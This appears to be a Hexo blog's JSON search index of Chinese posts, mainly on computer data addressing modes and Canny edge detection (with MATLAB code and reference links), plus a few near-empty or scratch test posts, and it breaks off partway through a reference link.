[{"title":"常见的数据寻址方式","url":"/p/65002/","content":"<h2 id=\"1-隐含寻址\"><a href=\"#1-隐含寻址\" class=\"headerlink\" title=\"1.隐含寻址\"></a>1.隐含寻址</h2><p>在指令中隐含着操作数的地址。</p>\n<p>如单地址的指令格式，就不是明显地在地址字段中指出第二操作数的地址，而是规定累加器ACC作为第二操作数，指令格式明显指出的仅是第一操作数的地址。因此，累加器ACC对单地址指令格式来说是隐含地址。</p>\n<p>隐含寻址的优点是有利于缩短指令字长；缺点是需增加硬件。</p>\n<h2 id=\"2-立即（数）寻址\"><a href=\"#2-立即（数）寻址\" class=\"headerlink\" title=\"2.立即（数）寻址\"></a>2.立即（数）寻址</h2><p>这种类型的指针的地址字段指出的不是操作数的地址么事操作数本身，又称为立即数。数据是用补码形式存放的。<br>OP      #(立即寻址特征)        A操作数本身</p>\n<p>立即寻址的优点是指令在执行阶段不访问主存，指令执行时间短；缺点是A的位数限制了立即数的范围。</p>\n<h2 id=\"3-直接寻址\"><a href=\"#3-直接寻址\" class=\"headerlink\" title=\"3.直接寻址\"></a>3.直接寻址</h2><p>指令字的形式地址地址A就是操作数的真实地址EA，即EA=A。</p>\n<p>直接寻址的优点是简单，指令在执行阶段仅访问一次主存，不需要专门计算操作的地址；缺点是A的位数决定了该指令操作数的寻址范围，操作数的地址不易修改。</p>\n<h2 id=\"4-间接寻址\"><a href=\"#4-间接寻址\" class=\"headerlink\" title=\"4.间接寻址\"></a>4.间接寻址</h2><p>间接寻址是相对于直接寻址而言的，指令的地址字段给出的形式地址不是操作数的真实地址，而是操作数有效地址所在的存储单元的地址，也就是操作数地址的地址，即EA=(A).</p>\n<p>间接寻址可以是一次间接寻址，还可以是多次间接寻址。</p>\n<p>主存第一位为1时，表示取出的仍不是操作数的地址，即多次间址；当主存第一位为0时，表示取出的是操作数的地址。</p>\n<p>间接寻址的优点是可以扩大寻址范围（优点地址EA的位数大于形式地址A的位数），便于编制程序（用间接寻址可以方便地完成子程序返回）；缺点是指令在执行阶段要多次访问。</p>\n<h2 id=\"5-寄存器寻址\"><a href=\"#5-寄存器寻址\" class=\"headerlink\" title=\"5.寄存器寻址\"></a>5.寄存器寻址</h2><p>在指令字中直接给出操作数所在寄存器编号，即EA=Ri，其操作数在由Ri所指的寄存器内。</p>\n<p>寄存器寻址的优点是指令在执行阶段不访问主存，只访问寄存器，指令字段短且执行速度快，支持向量/矩阵运算；缺点是寄存器价格昂贵，计算机中寄存器个数有限。</p>\n<h2 id=\"6-寄存器间接寻址\"><a href=\"#6-寄存器间接寻址\" class=\"headerlink\" title=\"6.寄存器间接寻址\"></a>6.寄存器间接寻址</h2><p>寄存器间接寻址是指在寄存器Ri中给出的不是一个操作数，而是操作数所在主存单元的地址，即EA=(Ri)</p>\n<p>寄存器间接寻址的特点是与一般间接寻址相比速度更快，但指令的执行阶段需要访问主存（因为操作数在主存中）。</p>\n<h2 id=\"7-相对寻址\"><a href=\"#7-相对寻址\" class=\"headerlink\" title=\"7.相对寻址\"></a>7.相对寻址</h2><p>相对寻址是把程序计数器PC的内容加上指令格式中的形式地址A而形成操作数的有效地址。即EA=（PC）+A，其中A是相对于当前地址的位移量，可正可负，补码表示。</p>\n<p>A的位数决定操作数的寻址范围。</p>\n<p>相对寻址的优点是操作数的地址不是固定的，它随着PC的值得变化而变化，并且与指令地址之间总是相差一个固定值，因此便于程序浮动，相对寻址广泛应用于转移指令。</p>\n<p>对于转移指令JMPA，当CPU从存储器中取出一个字节时，会自动执行（PC）+1-&gt;PC.若转移指令的地址为X,且占2个字节，在取出该指令后PC的值会增2，即（PC）=X+2，这样在执行完该指令后，会指定跳转到X+2+A的地址继续执行。</p>\n<h2 id=\"8-基址寻址\"><a href=\"#8-基址寻址\" class=\"headerlink\" title=\"8.基址寻址\"></a>8.基址寻址</h2><p>基址寻址是将CPU中基址寄存器（BR）的内容加上指令格式中的形式地址A，而形成操作数的有效地址，EA=(BR)+A。其中基址寄存器既可采用专用寄存器，也可以采用通用寄存器。</p>\n<p>基址寄存器是面向操作系统的，其内容由操作系统或管理程序确定。在程序执行过程中，基址寄存器的内容不变（作为基地址），形式地址可变（作为偏移量）。当采用通用寄存器作为基址寄存器时，可由用户决定哪个寄存器作为基址寄存器，但其内容仍由操作系统确定。</p>\n<p>基址寻址的特点是可扩大寻址范围（基址寻址的位数大于形式地址A的位数）；用户不必考虑自己的程序存于主存的哪一空间区域，故有利于多道程序设计，以及可用于编制浮动程序。</p>\n<h2 id=\"9-变址寻址\"><a href=\"#9-变址寻址\" class=\"headerlink\" title=\"9.变址寻址\"></a>9.变址寻址</h2><p>有效地址EA等于指令中的形式地址A与编制寄存器IX的内容相加之和，即EA=(IX)+A，其中IX为变址寄存器（专用），也可用通用寄存器作为变址寄存器。</p>\n<p>变址寄存器是面向用户的，在程序执行过程中，变址寄存器的内容可由用户改变（作为偏移量），形式地址A不变（作为基地址）。</p>\n<p>变址寻址的优点是可扩大寻址范围（变址寄存器的位数大于形式地址A的位数），在数组处理过程中，可设定A为数组的首地址，不断改变变址寄存器IX的内容，便可很容易形成数组中任意数据的地址，特别适合编制循环程序。</p>\n<p>显然，变址寻址与基址寻址的有效地址形成过程及其相似。但从本质上来讲，两者有较大区别。基址寻址主要用于为多道程序或数据分配存储空间，故基址寄存器的内容通常由操作系统和管理程序确定，在程序的执行过程中其值不可变，而指令字中的A是可变的；变址寻址主要用于处理数组问题，在变址寻址中，变址寄存器的内容是由用户设定的，在程序执行过程中，其值可变，而指令字中的A是不可变的。</p>\n<h2 id=\"10-堆栈寻址\"><a href=\"#10-堆栈寻址\" class=\"headerlink\" title=\"10.堆栈寻址\"></a>10.堆栈寻址</h2><p>堆栈是存储器（或专用寄存器组）中一块特定的按“先进后出（LIFO）”原则管理的存储区，该存储区中被读、写单元的地址是用特定的寄存器给出的，该寄存器称为堆栈指针（SP）。堆栈可分为硬堆栈和软堆栈两种。</p>\n<p>寄存器堆栈又称为硬堆栈。寄存器堆栈的成本比较高，不适合做大容量的堆栈；而从主存中划出一段区域来做堆栈是最合算且最常用的方法，这种堆栈称为软堆栈。</p>\n<p>在采用堆栈结构的计算机系统中，大部分指令表面上都表现为为无操作数指令的形式，因为操作数地址都隐含使用了SP。通常情况下，在读写堆栈中的一个单元的前后都伴有自动完成对SP内容的增量或减量操作。</p>\n","categories":["计算机组成原理"],"tags":["计算机"]},{"title":"burpsuite使用","url":"/p/65000/","content":"","categories":["burpsuite"],"tags":["hexo"]},{"title":"leetcoe两数相加","url":"/p/65008/","content":"<p>##今天刷到的两数相加</p>\n<p><strong>题目：</strong>大师</p>\n<blockquote>\n<p>leetcode</p>\n<blockquote>\n<p>dsfdfs</p>\n</blockquote>\n</blockquote>\n<hr>\n<p>两个反序的链表组成两个数，把这两个数相加再反序<br>![blockchain](<a href=\"https://ss0.bdstatic.com/70cFvHSh_Q1YnxGkpoWK1HF6hhy/it/\">https://ss0.bdstatic.com/70cFvHSh_Q1YnxGkpoWK1HF6hhy/it/</a><br>u=702257389,1274025419&amp;fm=27&amp;gp=0.jpg “区块链”)</p>\n<hr>\n<p><a href=\"http://jianshu.com/\">简书</a>  </p>\n<ul>\n<li>先提取  </li>\n<li>在反序  </li>\n<li>再相加  </li>\n</ul>\n<ul>\n<li>先反序  </li>\n<li>再提取  </li>\n<li>再相加  </li>\n</ul>\n<ol>\n<li>链表不用自己写  </li>\n<li>用现成的内置库文件  </li>\n</ol>\n<ul>\n<li>第三方付    <ul>\n<li>第三方士大夫dsf   <figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">&quot;My New Post&quot;</span>   </span><br><span class=\"line\"></span><br><span class=\"line\">```   </span><br><span class=\"line\"></span><br><span class=\"line\">```java</span><br><span class=\"line\">Linkedlist&lt;Integer&gt; l = new Linklist&lt;Integer&gt;();  </span><br><span class=\"line\">System.out.print(<span class=\"string\">&quot;linklist &quot;</span>);   </span><br></pre></td></tr></table></figure></li>\n</ul>\n</li>\n</ul>\n","categories":["算法"]},{"title":"更换主题","url":"/p/65004/","content":"","categories":["first"],"tags":["主题"]},{"title":"第二次尝试","url":"/p/65003/","content":"<p>#abc<br>#$$fdsfd<br>{dsfds}<br>(百度)[<a href=\"http://www.baidu.com]\">http://www.baidu.com]</a></p>\n","categories":["first"],"tags":["hexo"]},{"title":"Canny图像分割","url":"/p/65010/","content":"<h1 id=\"基于Canny的图像分割\"><a href=\"#基于Canny的图像分割\" class=\"headerlink\" title=\"基于Canny的图像分割\"></a>基于Canny的图像分割</h1><h2 id=\"图像分割方法分类\"><a href=\"#图像分割方法分类\" class=\"headerlink\" title=\"图像分割方法分类\"></a>图像分割方法分类</h2><p>​    现有的图像分割方法主要分以下几类：基于阈值的分割方法、基于区域的分割方法、基于边缘的分割方法以及基于特定理论的分割方法等。</p>\n<span id=\"more\"></span>\n\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/pic/blog/canny/typora-user-images/image-20211127130443477.png\" alt=\"image-20211127130443477\"></p>\n<p>​        图1(a)是一个理想的边缘所具备的特性。每个灰度级跃变到一个垂直的台阶上。而实际上，在图像采集系统的性能、采样率和获取图像的照明条件等因素的影响，得到的边缘往往是模糊的，边缘被模拟成具有“斜坡面”的剖面，如图1(b)所示，在这个模型中，模糊的边缘变得“宽”了，而清晰的边缘变得“窄”了。</p>\n<p>​        图像的边缘有方向和幅度两种属性。边缘通常可以通过一阶导数或二阶导数检测得到。一阶导数是以最大值作为对应的边缘的位置，而二阶导数则以过零点作为对应边缘的位置</p>\n<p>​        图像边缘是图像最基本的特征，所谓<strong>边缘</strong>(Edge) 是指图像局部特性的不连续性。灰度或结构等信息的突变处称之为<strong>边缘</strong>。例如，灰度级的突变、颜色的突变,、纹理结构的突变等。边缘是一个区域的结束，也是另一个区域的开始，利用该特征可以分割图像</p>\n<h2 id=\"canny算法简介\"><a href=\"#canny算法简介\" class=\"headerlink\" title=\"canny算法简介\"></a>canny算法简介</h2><h3 id=\"起源\"><a href=\"#起源\" class=\"headerlink\" title=\"起源\"></a>起源</h3><p>​        Canny<a href=\"https://baike.baidu.com/item/%E8%BE%B9%E7%BC%98%E6%A3%80%E6%B5%8B\">边缘检测</a>算子是John F. Canny于 1986 年开发出来的一个多级边缘检测算法。更为重要的是 Canny 创立了<em>边缘检测计算理论</em>（Computational theory of edge detection）解释这项技术如何工作。</p>\n<p>通常情况下边缘检测的目的是在保留原有图像属性的情况下，显著减少图像的数据规模。有多种算法可以进行边缘检测，虽然Canny算法年代久远，但可以说它是边缘检测的一种标准算法，而且仍在研究中广泛使用。</p>\n<h3 id=\"准则\"><a href=\"#准则\" class=\"headerlink\" title=\"准则\"></a>准则</h3><p>​        Canny 的目标是找到一个最优的<a href=\"https://baike.baidu.com/item/%E8%BE%B9%E7%BC%98%E6%A3%80%E6%B5%8B\">边缘检测</a>算法，最优边缘检测的含义是：</p>\n<p>(1)最优检测：算法能够尽可能多地标识出图像中的实际边缘，漏检真实边缘的概率和误检非边缘的概率都尽可能小；</p>\n<p>(2)最优定位准则：检测到的边缘点的位置距离实际边缘点的位置最近，或者是由于噪声影响引起检测出的边缘偏离物体的真实边缘的程度最小；</p>\n<p>(3)检测点与边缘点一一对应：算子检测的边缘点与实际边缘点应该是一一对应。</p>\n<p>为了满足这些要求 Canny 使用了<a href=\"https://baike.baidu.com/item/%E5%8F%98%E5%88%86%E6%B3%95\">变分法</a>（calculus of variations），这是一种寻找优化特定功能的函数的方法。最优检测使用四个<a href=\"https://baike.baidu.com/item/%E6%8C%87%E6%95%B0%E5%87%BD%E6%95%B0\">指数函数</a>项表示，但是它非常近似于<a href=\"https://baike.baidu.com/item/%E9%AB%98%E6%96%AF%E5%87%BD%E6%95%B0\">高斯函数</a>的一阶<a href=\"https://baike.baidu.com/item/%E5%AF%BC%E6%95%B0\">导数</a>。</p>\n<h2 id=\"算法流程\"><a href=\"#算法流程\" class=\"headerlink\" title=\"算法流程\"></a>算法流程</h2><h3 id=\"Canny边缘检测算法可以分为以下5个步骤：\"><a href=\"#Canny边缘检测算法可以分为以下5个步骤：\" class=\"headerlink\" title=\"Canny边缘检测算法可以分为以下5个步骤：\"></a>Canny边缘检测算法可以分为以下5个步骤：</h3><ol>\n<li><p>应用高斯滤波来平滑图像，目的是去除噪声</p>\n</li>\n<li><p>找寻图像的强度梯度（intensity gradients）</p>\n</li>\n<li><p>应用非最大抑制（non-maximum suppression）技术来消除边误检（本来不是但检测出来是）</p>\n</li>\n<li><p>应用双阈值的方法来决定可能的（潜在的）边界</p>\n</li>\n</ol>\n<h3 id=\"高斯滤波平滑图片\"><a href=\"#高斯滤波平滑图片\" class=\"headerlink\" title=\"高斯滤波平滑图片\"></a>高斯滤波平滑图片</h3><p><a href=\"https://blog.csdn.net/fangyan90617/article/details/100516889\">https://blog.csdn.net/fangyan90617/article/details/100516889</a></p>\n<p>​    高斯滤波在图像处理概念下，将图像频域处理和时域处理相联系，作为低通滤波器使用，可以将低频能量（比如噪声）滤去，起到图像平滑作用。</p>\n<p>​    高斯滤波是一种线性平滑滤波，适用于消除高斯噪声，广泛应用于图像处理的减噪过程。通俗的讲，高斯滤波就是对整幅图像进行加权平均的过程，每一个像素点的值，都由其本身和邻域内的其他像素值经过加权平均后得到。高斯滤波的具体操作是：用一个模板（或称卷积、掩模）扫描图像中的每一个像素，用模板确定的邻域内像素的加权平均灰度值去替代模板中心像素点的值用。高斯平滑滤波器对于抑制服从正态分布的噪声非常有效。</p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/pic/blog/canny/typora-user-images/image-20211127125413959.png\" alt=\"image-20211127125413959\">    </p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/pic/blog/canny/typora-user-images/image-20211127125128196.png\" alt=\"image-20211127125128196\"></p>\n<h3 id=\"找寻图像的强度梯度\"><a href=\"#找寻图像的强度梯度\" class=\"headerlink\" title=\"找寻图像的强度梯度\"></a>找寻图像的强度梯度</h3><p>梯度 的理解<a href=\"https://blog.csdn.net/qq_36622009/article/details/102900447\">https://blog.csdn.net/qq_36622009/article/details/102900447</a><br>        <a href=\"https://zhuanlan.zhihu.com/p/113397988#WsZtFtzL\">https://zhuanlan.zhihu.com/p/113397988#WsZtFtzL</a></p>\n<h4 id=\"原理介绍\"><a href=\"#原理介绍\" class=\"headerlink\" title=\"原理介绍\"></a>原理介绍</h4><p>一幅图像可以表示为函数 I = f(x, y)，其中(x, y)为坐标，I表示该像素点的灰度值，梯度gradient表示函数f(x, y)在点(x, y)处最大的变化率，计算的表达式为：</p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/pic/blog/canny/typora-user-images/image-20211127125927883.png\" alt=\"image-20211127125927883\"></p>\n<p>  对于图像，我们也可以计算梯度，由于数字图像是有离散的像素点的灰度值构成，所以微分运算就变成了差分，我们可以用相邻两个像素点之间的差分值表示该像素点在某个方向上灰度的变化情况。</p>\n<p>​        可选用的模板：soble算子、Prewitt算子、Roberts模板等等;</p>\n<p>一般采用soble算子，OpenCV也是如此，利用soble水平和垂直算子与输入图像卷积计算dx、dy</p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/pic/blog/canny/typora-user-images/image-20211127125645860.png\" alt=\"image-20211127125645860\"></p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/pic/blog/canny/typora-user-images/image-20211127125654044.png\" alt=\"image-20211127125654044\"></p>\n<p>   <img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/pic/blog/canny/typora-user-images/image-20211127125714539.png\" alt=\"image-20211127125714539\"></p>\n<p>由此可以得到图像的梯度</p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/pic/blog/canny/typora-user-images/image-20211127125738044.png\" alt=\"image-20211127125738044\"></p>\n<p>为了简化计算，幅值也可以作如下近似：<img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/pic/blog/canny/typora-user-images/image-20211127125812581.png\" alt=\"image-20211127125812581\"></p>\n<p>角度为</p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/pic/blog/canny/typora-user-images/image-20211127125825243.png\" alt=\"image-20211127125825243\"></p>\n<h3 id=\"非最大抑制（non-maximum-suppression）技术来消除边误检\"><a href=\"#非最大抑制（non-maximum-suppression）技术来消除边误检\" class=\"headerlink\" title=\"非最大抑制（non-maximum suppression）技术来消除边误检\"></a>非最大抑制（non-maximum suppression）技术来消除边误检</h3><h4 id=\"数学概念\"><a href=\"#数学概念\" class=\"headerlink\" title=\"数学概念\"></a>数学概念</h4><p>​        顾名思义就是抑制不是极大值的元素，可以理解为局部最大搜索。这个局部代表的是一个邻域，邻域有两个参数可变，一是邻域的维数，二是邻域的大小。</p>\n<h4 id=\"近似划分\"><a href=\"#近似划分\" class=\"headerlink\" title=\"近似划分\"></a>近似划分</h4><p>由于由梯度计算出来的图像边缘是很模糊的，对于存在很多个边缘梯度响应的现象。我们力求在一个梯度方向上找到一个局部的最大值来表示该梯度方向上的梯度响应。在平面360范围内然后把它近似到四个方向，分别代表水平，垂直和两个对角线方向（0°,45°,90°,135°），每个区域的梯度角给一个特定值，代表四个方向之一，如下图所示<br><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/pic/blog/canny/typora-user-images/image-20211127131334741.png\" alt=\"image-20211127131334741\"></p>\n<p><strong>优点</strong></p>\n<p>这样做的好处是便于计算，便于理解,把在每一个区域内的梯度方向全部近似为一个梯度方向，在这近似的一个梯度方向前后寻求最大值。</p>\n<p><strong>缺点</strong></p>\n<p>没有插值处理，计算的每一个点的梯度在它的8邻域的梯度方向并不是你所 划分的梯度方向，所处的像素点不是整像素，是小数。</p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/pic/blog/canny/typora-user-images/image-20211127131508517.png\" alt=\"image-20211127131508517\"></p>\n<h4 id=\"插值处理（2种方法）\"><a href=\"#插值处理（2种方法）\" class=\"headerlink\" title=\"插值处理（2种方法）\"></a>插值处理（2种方法）</h4><p>现在我们可以在划分好的梯度方向上寻求局部梯度最大值，将当前像素的梯度强度与沿正负梯度方向上的两个像素进行比较。如果当前像素的梯度强度与另外两个像素相比最大，则该像素点保留为边缘点，否则该像素点将被抑制。但是当出现最大值梯度方向不在整像素，而是亚像素，通常为了更加精确的计算，在跨越梯度方向的两个相邻像素之间使用线性插值来得到要比较的像素梯度，如下图蓝线所示情况：<br>   <img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/pic/blog/canny/typora-user-images/image-20211127124849966.png\" alt=\"image-20211127124849966\"></p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/pic/blog/canny/typora-user-images/image-20211127131427339.png\" alt=\"image-20211127131427339\"></p>\n<p><strong>优点</strong><br> 这样做的好处计算更精确，避免了大量的近似估计。<br> <strong>缺点</strong><br> 运算速度慢，计算不太方便，不过插值处理效果比近似划分好多了</p>\n<h3 id=\"双阈值处理边界\"><a href=\"#双阈值处理边界\" class=\"headerlink\" title=\"双阈值处理边界\"></a>双阈值处理边界</h3><h4 id=\"具体方法\"><a href=\"#具体方法\" class=\"headerlink\" title=\"具体方法\"></a>具体方法</h4><p>（1） 根据图像选取合适的高阈值和低阈值，通常高阈值是低阈值的2到3倍<br>（2） 如果某一像素的梯度值高于高阈值，则保留<br>（3） 如果某一像素的梯度值低于低阈值，则舍弃<br>（4） 如果某一像素的梯度值介于高低阈值之间，则从该像素的8邻域的寻找像素梯度值，如果存在像素梯度值高于高阈值，则保留，如果没有，则舍弃</p>\n<p>两个阈值是有区别的：</p>\n<p>高的那个阈值是将要提取轮廓的物体与背景区分开来，就像阈值分割的参数一样，是决定目标与背景对比度的；</p>\n<p>低的阈值是用来平滑边缘的轮廓，有时高的阈值设置太大了，可能边缘轮廓不连续或者不够平滑，通过低阈值来平滑轮廓线，或者使不连续的部分连接起来。两个阈值：T1，T2。大于T1的称为强边界。T1和T2之间的为弱边界。</p>\n<h4 id=\"双阈值好处\"><a href=\"#双阈值好处\" class=\"headerlink\" title=\"双阈值好处\"></a>双阈值好处</h4><p>如果只有强边界，那么边界可能断断续续。而且会少分割。所以弱边界的作用就是解决上面这个问题。如果强边界点的8连通区域内有弱边界点，那么认为该弱边界点为强边界</p>\n<h2 id=\"源代码实现\"><a href=\"#源代码实现\" class=\"headerlink\" title=\"源代码实现\"></a>源代码实现</h2><h3 id=\"matlab-自带代码\"><a href=\"#matlab-自带代码\" class=\"headerlink\" title=\"matlab 自带代码\"></a>matlab 自带代码</h3><figure class=\"highlight matlab\"><table><tr><td class=\"code\"><pre><span class=\"line\">Img = imread(<span class=\"string\">&#x27;cameraman.tif&#x27;</span>); <span class=\"comment\">% 读取图像</span></span><br><span class=\"line\">M = <span class=\"built_in\">size</span>(Img);            <span class=\"comment\">% 计算图像大小</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"built_in\">numel</span>(M)&gt;<span class=\"number\">2</span>             <span class=\"comment\">%判断图像是否是彩色图像</span></span><br><span class=\"line\">    gray = rgb2gray(Img); <span class=\"comment\">% 图像灰度变换</span></span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">    gray = Img;</span><br><span class=\"line\"><span class=\"keyword\">end</span></span><br><span class=\"line\">Cimg = edge(gray,<span class=\"string\">&#x27;canny&#x27;</span>);</span><br><span class=\"line\"><span class=\"built_in\">figure</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">subplot(<span class=\"number\">121</span>); imshow(gray,[]); title(<span class=\"string\">&#x27;原图&#x27;</span>);</span><br><span class=\"line\">subplot(<span class=\"number\">122</span>); imshow(Cimg,[]); title(<span class=\"string\">&#x27;Canny边缘检测&#x27;</span>);</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"自己实现的代码\"><a href=\"#自己实现的代码\" class=\"headerlink\" title=\"自己实现的代码\"></a>自己实现的代码</h3><p><a href=\"https://zhuanlan.zhihu.com/p/99959996\">https://zhuanlan.zhihu.com/p/99959996</a></p>\n<p><a href=\"\">https://www.cnblogs.com/tiandsp/archive/2012/12/13/2817240.html</a></p>\n<h3 id=\"效果图对比\"><a href=\"#效果图对比\" class=\"headerlink\" title=\"效果图对比\"></a>效果图对比</h3><p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/pic/blog/canny/typora-user-images/image-20211127131022095.png\" alt=\"image-20211127131022095\"></p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/pic/blog/canny/typora-user-images/image-20211127131037701.png\" alt=\"image-20211127131037701\"></p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/pic/blog/canny/typora-user-images/image-20211127131045758.png\" alt=\"image-20211127131045758\"></p>\n<h2 id=\"算法对比\"><a href=\"#算法对比\" class=\"headerlink\" title=\"算法对比\"></a>算法对比</h2><p>相比Sobel、Prewitt等算子，Canny算法更为优异。Sobel、Prewitt等算子有如下缺点：</p>\n<p>没有充分利用边缘的梯度方向。</p>\n<p>最后得到的二值图，只是简单地利用单阈值进行处理。</p>\n<p>而Canny算法基于这两点做了改进，提出了：</p>\n<p>1、 基于边缘梯度方向的非极大值抑制。</p>\n<p>2、 双阈值的滞后阈值处理。</p>\n<p><strong>最优边缘检测，它包括三个方面</strong></p>\n<p>1，好检测：尽可能多的标记处实际边缘（多）</p>\n<p>2，好定位：标记出来的边缘应该尽可能多的接近实际边缘（准）</p>\n<p>3，小响应：图像中的边缘只能标识一次，并且可能存在的图像噪声不应该标识为边缘</p>\n<p>这三个方面，恰恰正是Canny算子的目标！Canny提出了判定边缘检测算子的3个准则：信噪比准则、定位精度准则和单边缘响应准则。</p>\n<p>这三个方面的另一种说法</p>\n<p>1.低失误率，既要少将真的边缘丢弃，也要少将非边缘判为边缘；</p>\n<p>2.高位置精度，检测出的边缘应在真正的边界上；</p>\n<p>3.单像素边缘，即对每个边缘有唯一的响应，得到的边界为单像素宽。</p>\n<p>4.canny法能够尽可能多地标识出图像中的实际边缘；标识出的边缘要与实际图像中的实际边缘尽可能接近。</p>\n<p>缺点 ：</p>\n<p>Canny算子比较复杂，既要计算多个方向的梯度，又要记录方向和大小，然后又进行NMS非极大值抑制，大小阈值，很复杂。正是因为Canny算子的目标高，所以他实现起来更为困难，但是相比于索贝尔算子，罗伯茨算子，Canny算子效果更好。他实际上是通过寻找图像梯度的局部最大值实现的。这种算子是一个具有滤波、增强以及检测的多阶段的优化算子。</p>\n<p>产生的边缘很细，可能就一个像素那么细，没有强弱之分。计算量大，但是准确。图像中的边缘只能标识一次，并且可能存在的图像噪声不应标识为边缘。    </p>\n<h1 id=\"参考文章\"><a href=\"#参考文章\" class=\"headerlink\" title=\"参考文章\"></a>参考文章</h1><p>原理+步骤：</p>\n<ol>\n<li>   <a href=\"https://blog.csdn.net/saltriver/article/details/80545571\">https://blog.csdn.net/saltriver/article/details/80545571</a></li>\n<li>   <a href=\"https://baike.baidu.com/item/Canny%E7%AE%97%E5%AD%90/8821789?fr=aladdin#2\">https://baike.baidu.com/item/Canny%E7%AE%97%E5%AD%90/8821789?fr=aladdin#2</a></li>\n<li>   <a href=\"https://blog.csdn.net/qq_41140138/article/details/105516289?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163792713716780271550581%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=163792713716780271550581&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-2-105516289.first_rank_v2_pc_rank_v29&amp;utm_term=canny%E8%BE%B9%E7%BC%98%E6%A3%80%E6%B5%8B%E7%AE%97%E6%B3%95&amp;spm=1018.2226.3001.4187\">https://blog.csdn.net/qq_41140138/article/details/105516289?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163792713716780271550581%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=163792713716780271550581&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-2-105516289.first_rank_v2_pc_rank_v29&amp;utm_term=canny%E8%BE%B9%E7%BC%98%E6%A3%80%E6%B5%8B%E7%AE%97%E6%B3%95&amp;spm=1018.2226.3001.4187</a>    （代码可以运行）</li>\n<li>   <a href=\"https://blog.csdn.net/fengxianghui01/article/details/89475897?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163792625516780357229320%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=163792625516780357229320&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-14-89475897.first_rank_v2_pc_rank_v29&amp;utm_term=canny%E8%BE%B9%E7%BC%98%E6%A3%80%E6%B5%8B%E7%AE%97%E6%B3%95matlab&amp;spm=1018.2226.3001.4187\">https://blog.csdn.net/fengxianghui01/article/details/89475897?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163792625516780357229320%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=163792625516780357229320&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-14-89475897.first_rank_v2_pc_rank_v29&amp;utm_term=canny%E8%BE%B9%E7%BC%98%E6%A3%80%E6%B5%8B%E7%AE%97%E6%B3%95matlab&amp;spm=1018.2226.3001.4187</a>      （代码可以运行）</li>\n<li><a href=\"https://blog.csdn.net/u014485485/article/details/78396493?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=canny%E8%BE%B9%E7%BC%98%E6%A3%80%E6%B5%8B%E7%AE%97%E6%B3%95matlab&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-7-78396493.first_rank_v2_pc_rank_v29&amp;spm=1018.2226.3001.4187\">https://blog.csdn.net/u014485485/article/details/78396493?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=canny%E8%BE%B9%E7%BC%98%E6%A3%80%E6%B5%8B%E7%AE%97%E6%B3%95matlab&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-7-78396493.first_rank_v2_pc_rank_v29&amp;spm=1018.2226.3001.4187</a><br> （文章里所含代码及例图是返回强度高于 threshold 的所有边缘的）（简短的步骤原理分析）</li>\n<li>   <a href=\"https://zhuanlan.zhihu.com/p/99959996\">https://zhuanlan.zhihu.com/p/99959996</a>    （包含代码）</li>\n<li>   <a href=\"https://www.jianshu.com/p/6023d0ff7bee\">https://www.jianshu.com/p/6023d0ff7bee</a></li>\n<li>   <a href=\"https://www.cnblogs.com/tiandsp/archive/2012/12/13/2817240.html\">https://www.cnblogs.com/tiandsp/archive/2012/12/13/2817240.html</a>  （主要是代码，代码可以实现）<br>优缺点：</li>\n<li>   Canny算子比较复杂，既要计算多个方向的梯度，又要记录方向和大小，然后又进行NMS非极大值抑制，大小阈值，很复杂。 产生的边缘很细，可能就一个像素那么细，没有强弱之分。计算量大，但是准确。</li>\n<li>   <a href=\"https://blog.csdn.net/zhuwei0710/article/details/69222842\">https://blog.csdn.net/zhuwei0710/article/details/69222842</a>   （实验结论部分可以参考一些canny算子的优缺点）</li>\n<li>   <a href=\"https://blog.csdn.net/weixin_33713503/article/details/93408952\">https://blog.csdn.net/weixin_33713503/article/details/93408952</a></li>\n<li>   <a href=\"https://blog.csdn.net/Lucky_yw/article/details/80079234\">https://blog.csdn.net/Lucky_yw/article/details/80079234</a></li>\n<li>   <a 